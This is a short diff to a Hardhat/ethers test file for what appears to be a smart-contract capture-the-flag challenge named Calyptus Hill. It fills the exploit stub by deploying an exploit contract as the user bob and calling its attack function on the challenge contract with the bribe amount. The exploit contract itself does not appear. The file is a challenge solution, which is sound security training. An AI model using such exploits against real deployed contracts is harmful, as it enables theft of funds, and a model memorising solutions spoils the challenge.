@@ -26,6 +26,16 @@ describe(challengeName, function () {
 
   it("Exploit", async function () {
     /** CODE YOUR EXPLOIT HERE  */
+    const CalyptusHillExploit = await ethers.getContractFactory(
+      "CalyptusHillExploit",
+      bob
+    );
+
+    this.exploit = await CalyptusHillExploit.deploy();
+
+    var bribe = await this.calyptusHill.bribe();
+
+    await this.exploit.connect(bob).attack(this.calyptusHill.address, {value: bribe});
   });
 
   after(async function () {
